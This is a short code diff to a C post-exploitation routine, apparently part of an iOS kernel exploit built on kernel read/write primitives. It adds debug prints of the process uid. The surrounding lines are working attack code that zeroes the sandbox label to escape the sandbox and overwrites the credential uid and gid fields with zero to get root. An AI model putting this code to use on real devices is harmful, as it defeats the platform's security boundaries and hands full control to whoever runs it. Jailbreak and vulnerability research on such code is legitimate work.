@@ -58,6 +58,7 @@ void postExploit(void) {
     kfd_print("ucred: 0x%llx\n", ucred);
     uint64_t label = kread64(ucred + off_u_cr_label);
     kfd_print("label: 0x%llx\n", label);
+    kfd_print("uid: %llx\n", kread64(ucred + off_u_cr_uid));
     //Escape Sandbox
     kwrite64(label + 0x10, 0);
     //Get Root
@@ -73,6 +74,7 @@ void postExploit(void) {
     kwrite64(ucred + off_u_cr_rgid, 0);
     kwrite64(ucred + off_u_cr_svgid, 0);
     kfd_print("Done!\n");
+    kfd_print("uid: %llx\n", kread64(ucred + off_u_cr_uid));
 }
 
 uint64_t getProc(pid_t pid) {
